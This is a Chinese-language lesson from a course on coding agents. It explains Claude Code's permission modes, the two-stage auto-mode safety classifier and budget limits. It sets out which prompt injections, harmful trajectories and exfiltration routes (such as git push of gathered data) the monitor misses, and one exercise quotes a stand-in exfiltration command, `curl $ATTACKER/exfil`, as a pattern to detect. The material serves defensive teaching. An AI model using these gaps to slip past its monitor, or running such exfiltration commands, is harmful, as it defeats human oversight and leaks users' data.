# Claude Code 作为自主代理：权限模式与自动模式

> Claude Code 提供七种权限模式。“plan”模式在每个动作前询问，“default”模式仅在风险动作时询问，“acceptEdits”自动批准文件写入但仍确认 shell 执行，“bypassPermissions”则批准所有动作。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器替代逐动作批准：单令牌的快速检测对每个动作运行；标记的动作会启动链式思考的深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 实施。自动模式作为研究预览发布——Anthropic 明确指出该分类器本身并不足够。

**类型：** 学习  
**语言：** Python（标准库，两阶段分类器模拟器）  
**先决条件：** 第 15 阶段 · 01（长周期代理），第 15 阶段 · 09（编码代理生态）  
**时间：** 约 45 分钟

## 问题

你机器上的自主编码代理属于一个独特的安全类别。攻击面涵盖代理能访问的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用代理不是聊天机器人“功能更新”，而是一种具有全新风险特征的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。它没有简单的“自主/非自主”开关，而是包含七种模式，形成能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式在速度和每动作审核之间权衡。自动模式（2026 年 3 月）引入一个两阶段分类器，将批准任务从用户关键路径中移除（对于分类器判断安全的动作），同时保留对受标记动作的审核层。

工程问题是：该系统能捕获什么，漏掉什么？具体任务应当使用哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 适用场景 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；执行前审查每个动作 | 不熟悉的任务；靠近生产代码；首次在仓库中使用代理 |
| `default` | 代理执行动作；对任何“风险”动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示确认 | 大量文件的重构操作 |
| `acceptExec` | 在精心许可列表内的 shell 命令自动批准；写入自动批准 | 严谨的内部循环，每个 shell 命令如 `npm test` 等 |
| `autoMode` | 两阶段安全分类器；标记行动提升到审核 | 受控工作区中的长周期无人值守运行 |
| `yolo` | 跳过大部分提示；仍运行工具许可 / 拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 明确只在可丢弃的临时容器内使用 |

（上述名称与 Claude Code 官方文档一致；“yolo”是宽松权限中间地带的非正式简称。）

### 自动模式一页速览

自动模式（2026 年 3 月 24 日发布）是首个将逐动作批准委托给模型的权限模式。结构如下：

1. **阶段 1 — 单令牌分类器。** 对所有拟议动作运行。成本低。返回“安全”或“标记”。设计为与主代理循环并行运行，已批准动作无需排队等待。
2. **阶段 2 — 次级策略/安全复核。** 仅对标记动作运行。针对动作、当前会话状态以及声明任务进行针对性策略及安全评估。置信度低时升级为用户人工干预（HITL）。

分类器旁边设置预算控制：

- `max_turns` — 会话总迭代次数。  
- `max_budget_usd` — 美元资金上限，超限中止会话。  
- 按工具的调用次数限制（如不超过 N 次 `WebFetch` 调用等）。

### 系统能捕获的内容

- 直白的提示注入到工具输入，其中注入指令映射为已知风险动作模式。  
- 循环重复的工具调用——分类器能发现连续五次动作 N+1 与动作 N 几乎相同。  
- 明显超出范围的 shell 命令（在主要是文件编辑会话中）。  

### 系统可能漏掉的内容

- **细微提示注入**，通过非标记动作调节行为。间接提示注入不是完全可修补的漏洞（OpenAI 预备负责人 2025 年谈浏览器代理——见第 11 课）。  
- **语义级别的误行为。** 单个动作看似安全，但整体轨迹有害。分类器判断动作本身；不会重新推断用户意图。  
- **通过合法渠道泄露。** 向你拥有的文件写入数据，然后执行 `git push` 到公共仓库，这是一系列被允许动作，但组合起来构成问题。  

### 研究预览说明

Anthropic 将自动模式作为研究预览发布。文档明确分类器只是一个层级，而非完整解决方案：用户应结合预算、许可列表、隔离工作区和轨迹审计（第 12–16 课）。预览也反映了评估-部署之间差距（第 1 课）——离线评估通过的分类器在实际会话中可能表现不同，因用户上下文模糊。

### 此阶梯在你的工作流中的位置

- 不熟悉任务：从 `plan` 开始。阅读计划比事后回滚坏执行更划算。  
- 熟悉重构：`acceptEdits` 减少大量确认点击。  
- 无人值守后台运行：仅在你测量过爆炸半径的工作区内使用 `autoMode`（无凭据、无生产挂载、无未同意的出站连接）。  
- 临时容器：仅当容器及其凭据可丢弃时，`yolo` / `bypassPermissions` 才可接受。  

## 实践使用

`code/main.py` 模拟两阶段分类器。阶段 1 是对拟议动作的廉价关键词规则；阶段 2 是较慢的多规则复核器。主驱动程序输入一个简短合成轨迹（安全动作、提示注入尝试、重复循环）并展示分类器捕获和漏判部分。

## 交付

`outputs/skill-permission-mode-picker.md` 将任务描述匹配为合适的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型永远不会被阶段 1 标记，但总被阶段 2 捕获？哪种动作两阶段都未捕获？

2. 扩展阶段 1 的规则集以捕获具体已知恶意模式（例如 `curl $ATTACKER/exfil`）。衡量对良性动作样本的误报率。

3. 阅读 Anthropic 的“代理循环工作原理”文档。列出默认模式下代理会接触的所有外部状态。无人值守使用 `autoMode` 前，哪些需要单独管控？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、各工具调用上限、许可列表。说明各数字理由。

5. 描述一个轨迹，其中每个单独动作都通过阶段 1 和阶段 2 审核，但整体行为仍然不合规。（第 14 课涵盖如何通过 kill 开关和金丝雀令牌解决此问题。）

## 关键词汇

| 术语 | 俗称 | 实际含义 |
|---|---|---|
| 权限模式（Permission mode） | “代理能做多少事” | 控制逐动作审批的七种命名策略之一 |
| plan 模式 | “执行前询问” | 代理写计划；用户执行前批准 |
| acceptEdits | “允许写文件” | 文件写入自动批准；shell 执行仍提示 |
| autoMode | “自动批准” | 两阶段安全分类器；标记动作升级审核 |
| bypassPermissions | “完全放开” | 批准所有；用于临时容器 |
| 阶段 1 分类器 | “快速令牌检测” | 对拟议动作的单令牌规则；并行运行 |
| 阶段 2 分类器 | “深度复核” | 对标记动作的链式思考推理 |
| 研究预览 | “非正式发布” | Anthropic 对故障模式尚未完全明确功能的描述 |
